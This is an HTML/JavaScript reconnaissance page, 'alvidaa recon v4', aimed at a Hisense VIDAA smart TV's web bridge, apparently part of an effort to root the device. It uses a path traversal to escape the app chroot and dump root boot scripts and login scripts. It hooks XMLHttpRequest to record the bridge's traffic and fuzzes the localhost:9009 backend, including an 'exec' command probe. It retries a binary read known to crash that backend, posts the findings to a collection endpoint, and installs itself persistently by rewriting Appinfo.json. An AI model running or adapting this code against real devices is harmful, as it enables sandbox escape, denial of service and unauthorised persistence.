<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>recon</title>
<style>
  html, body { margin: 0; padding: 0; background: #000; color: #ccc; }
  #out { font: 19px/1.4 Menlo, Consolas, monospace; white-space: pre-wrap;
         word-break: break-all; padding: 10px; }
  .ok { color: #8f8; } .err { color: #f88; } .warn { color: #fd6; } .hdr { color: #6cf; }
  #btns { position: fixed; top: 6px; right: 6px; z-index: 2; }
  #btns div { display: inline-block; background: #123; color: #6cf; border: 2px solid #6cf;
              padding: 10px 16px; margin-left: 8px; font: bold 18px Menlo, monospace; }
</style>
</head>
<body>
<div id="btns">
  <div onclick="location.reload()">RERUN</div>
  <div id="inst">INSTALL AS APP</div>
</div>
<div id="out"></div>
<script>
(function () {
  "use strict";

  // Recon v4.
  // v3 established: fileRead/fileWrite chroot to /APPS, "../" escapes to /,
  // rootfs is dm-verity-protected squashfs (locked/green AVB), UART getty on
  // ttyS0, root shell = /usr/local/scripts/rootlogin.sh, UID-0 cli account,
  // rw+exec mounts: /APPS /data /var/local /var/tvservice /OAD.
  // v3 also revealed the bridge is a JS shim XHRing http://localhost:9009 and
  // that binary reads crash that backend.
  // v4: (1) capture the shim's wire format by patching XHR.prototype,
  // (2) identify the file service via /proc/self, (3) dump the boot scripts
  // that map root services to rw mounts, (4) fuzz the raw 9009 API.
  // The report is POSTed incrementally after each section.

  var el = document.getElementById("out");
  var report = {
    started: new Date().toISOString(),
    ua: navigator.userAgent,
    href: location.href,
    wire: [],
    identity: {},
    files: {},
    api: {},
    binaries: {}
  };

  function trunc(s, n) {
    s = String(s == null ? "" : s);
    return s.length > n ? s.slice(0, n) + "…(" + s.length + " chars)" : s;
  }

  function normMsg(m) {
    if (m == null) return "";
    if (typeof m === "string") return m;
    try { return JSON.stringify(m); } catch (e) { return String(m); }
  }

  function line(text, cls) {
    var d = document.createElement("div");
    d.textContent = text;
    if (cls) d.className = cls;
    el.appendChild(d);
    window.scrollTo(0, document.body.scrollHeight);
  }

  function isOk(ret) {
    if (ret === true) return true;
    if (typeof ret === "number") return ret !== 0;
    if (typeof ret === "string") return ret !== "" && ret !== "0";
    return false;
  }

  function save(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open("POST", "/api/recon", true);
      x.setRequestHeader("Content-Type", "application/json");
      x.send(JSON.stringify({ tag: tag, at: new Date().toISOString(), report: report }));
    } catch (e) { /* screen still shows results */ }
  }

  function enumBridge() {
    var found = [];
    var names = Object.getOwnPropertyNames(window);
    for (var i = 0; i < names.length; i++) {
      var n = names[i];
      if (!/^(Hisense|Hi[A-Z]|vidaa|Vidaa|WebAPI|webapi)/i.test(n)) continue;
      var v;
      try { v = window[n]; } catch (e) { continue; }
      found.push(n + ":" + typeof v);
    }
    return found;
  }

  // -- wire capture: the shim calls XHR through the prototype at call time,
  //    so patching the prototype records its exact requests.
  var wire = report.wire;
  try {
    var proto = window.XMLHttpRequest.prototype;
    var origOpen = proto.open, origSend = proto.send,
        origHdr = proto.setRequestHeader;
    proto.open = function (m, u) {
      this.__rec = { method: m, url: String(u), headers: {}, body: null, via: "patched" };
      wire.push(this.__rec);
      return origOpen.apply(this, arguments);
    };
    proto.setRequestHeader = function (k, v) {
      if (this.__rec) this.__rec.headers[k] = String(v);
      return origHdr.apply(this, arguments);
    };
    proto.send = function (b) {
      if (this.__rec) {
        this.__rec.body = b == null ? null : trunc(
          typeof b === "string" ? b : "(binary)", 2000);
      }
      return origSend.apply(this, arguments);
    };
  } catch (e) {
    wire.push({ patchError: String(e) });
  }

  // Uses the (possibly patched) XHR via the shim — hiCall stays identical.
  function hiCall(action, params) {
    try {
      if (typeof HiUtils_createRequest !== "function") return { error: "no bridge" };
      var r = HiUtils_createRequest(action, params);
      if (r && typeof r === "object") {
        return { ret: r.ret, msg: normMsg(r.msg) };
      }
      return { value: trunc(r, 2000) };
    } catch (e) {
      return { exception: String(e) };
    }
  }

  function hiFn(name) {
    try {
      var f = window[name];
      if (typeof f !== "function") return { error: "missing" };
      var r = f();
      if (r && typeof r === "object") return normMsg(r);
      return trunc(r, 2000);
    } catch (e) {
      return "threw: " + String(e);
    }
  }

  function rd(path) {
    var r = hiCall("fileRead", { path: path, mode: 6 });
    report.files[path] = r;
    return r;
  }

  // Raw direct XHR to the hiutils backend (bypasses the shim's restrictions).
  function rawApi(method, url, body, timeoutMs) {
    return new Promise(function (resolve) {
      try {
        var x = new XMLHttpRequest();
        // construction goes through the patched prototype, so tag the record
        if (x.__rec) x.__rec.via = "fuzzer";
        x.open(method, url, true);
        x.timeout = timeoutMs || 4000;
        x.onload = function () {
          resolve({ status: x.status,
                    head: trunc(x.responseText || "", 2000) });
        };
        x.onerror = function () { resolve({ error: "blocked or failed" }); };
        x.ontimeout = function () { resolve({ error: "timeout" }); };
        if (body != null) x.setRequestHeader("Content-Type", "application/json");
        x.send(body == null ? null : body);
      } catch (e) {
        resolve({ exception: String(e) });
      }
    });
  }

  var IDENTITY_CALLS = [
    "Hisense_GetFirmWareVersion", "Hisense_GetOSVersion", "Hisense_GetChipSetName",
    "Hisense_GetModelName", "Hisense_GetSerialType", "Hisense_GetChromiumVersion"
  ];

  // ".." = real root (proven). Order: identity of the file service first —
  // if hiutils runs as root, the whole picture changes.
  var DUMP_TARGETS = [
    "proc/self/cmdline",
    "proc/self/status",
    "sys/fs/selinux/enforce",
    "etc/init.d/rcS.utopia.linux",
    "etc/init.d/rcS.utopia.linuxB",
    "etc/rc.d/rc.local",
    "usr/local/scripts/login.sh",
    "usr/local/scripts/rootlogin.sh",
    "etc/cli_login.sh",
    "etc/inittab"
  ];

  function run() {
    line("== alvidaa recon v4 ==");
    line(report.ua, "warn");
    save("start");

    // 1. bridge surface + identity
    var b = enumBridge();
    line("bridge: " + b.length + " functions", b.length ? "ok" : "err");
    for (var i = 0; i < IDENTITY_CALLS.length; i++) {
      var v = hiFn(IDENTITY_CALLS[i]);
      report.identity[IDENTITY_CALLS[i]] = v;
    }
    line("fw=" + report.identity.Hisense_GetFirmWareVersion +
         " os=" + report.identity.Hisense_GetOSVersion +
         " chip=" + report.identity.Hisense_GetChipSetName, "ok");
    save("identity");

    // 2. who runs the file service? + selinux + boot scripts
    line("-- service identity + boot map --", "hdr");
    for (var j = 0; j < DUMP_TARGETS.length; j++) {
      var t = DUMP_TARGETS[j];
      var r = rd("../" + t);
      if (isOk(r.ret)) {
        line("[ok] /" + t + " (" + r.msg.length + " b): " + trunc(r.msg, 300), "ok");
      } else {
        line("[--] /" + t + ": " + trunc(r.msg, 100));
      }
    }
    save("dumps");

    // 3. raw API fuzz on localhost:9009 — shape learned from wire[]
    line("-- raw api --", "hdr");
    var chain = Promise.resolve();
    chain = chain.then(function () {
      var probes = [
        { m: "GET", u: "http://localhost:9009/service/hiutils", b: null },
        { m: "GET", u: "http://localhost:9009/", b: null },
        { m: "POST", u: "http://localhost:9009/service/hiutils",
          b: JSON.stringify({ type: "fileRead", path: "../etc/inittab", mode: 6 }) },
        { m: "POST", u: "http://localhost:9009/service/hiutils",
          b: JSON.stringify({ action: "fileRead", params: { path: "../etc/inittab", mode: 6 } }) },
        { m: "POST", u: "http://localhost:9009/service/hiutils",
          b: JSON.stringify({ action: "listdir", params: { path: "../etc/init.d/" } }) },
        { m: "POST", u: "http://localhost:9009/service/hiutils",
          b: JSON.stringify({ action: "getfilelist", params: { path: "../etc/init.d/" } }) },
        { m: "POST", u: "http://localhost:9009/service/hiutils",
          b: JSON.stringify({ action: "exec", params: { cmd: "id" } }) }
      ];
      var results = {};
      var inner = Promise.resolve();
      probes.forEach(function (p, idx) {
        inner = inner.then(function () {
          return rawApi(p.m, p.u, p.b).then(function (res) {
            results["probe" + idx + "_" + p.m + "_" + p.u.replace(/.*9009/, "") +
                    "_" + trunc(p.b, 60)] = res;
            line("[" + p.m + " " + trunc(p.u.replace("http://localhost:9009", ""), 30) +
                 " " + trunc(p.b, 40) + "] -> " + JSON.stringify(trunc(res, 160)),
              res.status === 200 ? "ok" : "");
          });
        });
      });
      return inner.then(function () {
        report.api = { probes: results, wire: wire };
        save("api");
      });
    });

    // 4. LAST and alone: one binary read retry (crashed the backend in v3)
    chain.then(function () {
      line("-- binary probe (backend may die here) --", "hdr");
      var br = rd("../bin/sh");
      report.binaries["bin/sh"] = { exists: isOk(br.ret), size: isOk(br.ret) ? br.msg.length : 0,
                                    head: trunc(br.msg, 80) };
      line(isOk(br.ret) ? "[exists] /bin/sh (" + br.msg.length + " b)" :
        "[--] /bin/sh: " + trunc(br.msg, 100), isOk(br.ret) ? "ok" : "");
      var alive = hiCall("fileRead", { path: "../etc/inittab", mode: 6 });
      report.binaries.backend_alive_after = isOk(alive.ret);
      line("backend alive after binary read: " + isOk(alive.ret),
        isOk(alive.ret) ? "ok" : "err");
      report.finished = new Date().toISOString();
      save("final");
      line("== done ==", "hdr");
    });
  }

  document.getElementById("inst").addEventListener("click", function () {
    var status = document.getElementById("inst");
    try {
      var base = location.href.replace(/recon\.html.*$/, "");
      var icon = base + "icon.png";
      var cur = hiCall("fileRead", { path: "websdk/Appinfo.json", mode: 6 });
      var list = cur.ret ? JSON.parse(cur.msg) : { AppInfo: [] };
      list.AppInfo = list.AppInfo.filter(function (a) { return a.Id !== "vidaa-recon"; });
      list.AppInfo.push({
        Id: "vidaa-recon", AppName: "Recon", Title: "Recon",
        URL: base + "recon.html", StartCommand: base + "recon.html",
        IconURL: icon, Icon_96: icon, Image: icon, Thumb: icon,
        Type: "Browser", InstallTime: "2026-10-29",
        RunTimes: 0, StoreType: "custom", PreInstall: false
      });
      var w = hiCall("fileWrite", { path: "websdk/Appinfo.json", mode: 6,
                                    writedata: JSON.stringify(list) });
      status.textContent = isOk(w.ret) ? "INSTALLED (restart TV)" : "install failed";
      status.style.color = isOk(w.ret) ? "#8f8" : "#f88";
    } catch (e) {
      status.textContent = "install threw: " + String(e);
    }
  });

  run();
})();
</script>
</body>
</html>
